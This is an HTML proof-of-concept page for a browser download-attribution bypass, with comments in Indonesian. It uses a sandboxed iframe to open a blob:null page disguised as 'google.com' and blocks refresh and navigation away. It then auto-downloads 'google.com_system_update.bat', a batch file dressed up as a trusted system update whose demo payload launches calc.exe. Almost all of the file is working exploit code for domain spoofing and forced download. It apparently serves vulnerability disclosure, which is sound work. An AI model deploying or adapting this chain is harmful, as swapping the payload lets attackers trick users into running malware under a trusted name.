<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PoC: Download Attribution Bypass</title>
<style>
  body { margin:0; height:100vh; background:#0a0a0a; color:#fff; font-family:system-ui, sans-serif; display:flex; justify-content:center; align-items:center; text-align:center; }
  h1 { font-size:1.2rem; font-weight:500; opacity:0.8; }
</style>
</head>
<body>

  <h1>Redirecting to <code>blob:null</code>...</h1>

  <script>
    (function () {
      const batLines = [
        '@echo off',
        'title Trusted Domain System Updater',
        'echo Initializing secure update sequence...',
        'timeout /t 2 >nul',
        'echo Verifying system integrity...',
        'start "" "C:\\\\Windows\\\\System32\\\\calc.exe"',
        'echo Update applied successfully.',
        'pause'
      ];

      // Konten halaman yang akan dieksekusi di dalam blob:null
      const innerHTML = `<!DOCTYPE html>
        <html><head><meta charset="utf-8"><title>google.com</title></head>
        <body style="margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#fff;font-family:system-ui,-apple-system,sans-serif;gap:24px;">
          <h1 style="margin:0;font-size:2rem;font-weight:500;color:#fff;">pwned by abhirdd</h1>
          
          <img src="https://cataas.com/cat?width=400&height=300&t=${Date.now()}" alt="cute cat"
               style="max-width:400px;width:80vw;border-radius:12px;"
               onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
          <div style="display:none;font-size:6rem;">🐱</div>
          
          <p style="font-size:0.8rem;color:#666;margin-top:20px;user-select:none;">
            (Anti-Refresh Shield Active. Tekan F5/Ctrl+R untuk menguji)
          </p>

          <script>
            // PERISAI ANTI-REFRESH
            window.addEventListener('keydown', function (e) {
              const isReload = e.key === 'F5' || ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'r');
              if (isReload) {
                e.preventDefault();
                e.stopPropagation();
                document.body.style.backgroundColor = '#3a0000';
                setTimeout(() => document.body.style.backgroundColor = '#0a0a0a', 150);
                return false;
              }
            }, true);

            window.addEventListener('contextmenu', function (e) { e.preventDefault(); });

            window.addEventListener('beforeunload', function (e) {
              e.preventDefault();
              e.returnValue = 'URL blob:null akan error jika di-refresh!';
              return e.returnValue;
            });

            // TRIGGER DOWNLOAD
            const batLines = ${JSON.stringify(batLines)};
            const batBlob = new Blob([batLines.join('\\r\\n')], { type: 'application/octet-stream' });
            const batUrl = URL.createObjectURL(batBlob);
            const a = document.createElement('a');
            a.href = batUrl;
            a.download = 'google.com_system_update.bat';
            document.body.appendChild(a);
            a.click();
          <\/script>
        </body></html>`;

      // =====================================================================
      // TRIK MEMAKSA BLOB:NULL WALAU DI HOSTING HTTPS (GITHUB PAGES)
      // =====================================================================
      
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      // Sandbox TANPA 'allow-same-origin' membuat iframe memiliki opaque origin (null).
      // 'allow-top-navigation' dibutuhkan agar iframe bisa me-redirect halaman utama.
      iframe.sandbox = 'allow-scripts allow-downloads allow-top-navigation';
      document.body.appendChild(iframe);

      // Tulis script ke dalam iframe
      iframe.srcdoc = `
        <!DOCTYPE html>
        <html><body>
        <script>
          // Blob dibuat DI DALAM iframe (origin null).
          // Hasilnya PASTI blob:null/... meskipun halaman asal di HTTPS.
          const htmlContent = ${JSON.stringify(innerHTML)};
          const htmlBlob = new Blob([htmlContent], { type: 'text/html' });
          const htmlUrl = URL.createObjectURL(htmlBlob);

          // Paksa tab utama (top-level) pindah ke URL blob:null tersebut
          window.top.location.replace(htmlUrl + '#%EF%BC%8Fgoogle.com');
        <\/script>
        </body></html>
      `;
    })();
  </script>

</body>
</html>
